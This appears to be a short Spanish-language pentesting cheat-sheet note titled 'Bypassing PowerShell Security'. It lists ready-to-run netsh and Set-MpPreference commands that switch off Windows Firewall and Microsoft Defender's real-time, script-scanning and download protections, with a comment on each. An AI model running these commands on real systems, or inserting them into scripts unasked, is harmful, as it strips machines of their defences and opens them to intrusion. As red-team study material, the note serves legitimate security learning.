## Bypassing PowerShell Security 

Tags: #AD #Bypass #AD #AV/Defender 

## Desactivación de protecciones de Windows

No es un bypass de detección; estás desactivando controles de seguridad. Estas acciones normalmente requieren privilegios de administrador/elevados.

```powershell 
❯ netsh advfirewall set allprofiles state off
# → Desactiva Windows Firewall en todos los perfiles
# → Normalmente requiere privilegios elevados

❯ Set-MpPreference -DisableRealtimeMonitoring $true
# → Desactiva la protección en tiempo real de Microsoft Defender

❯ Set-MpPreference -DisableScriptScanning $true
# → Desactiva el análisis de scripts de Defender

❯ Set-MpPreference -DisableIOAVProtection $true
# → Desactiva la protección de archivos descargados
```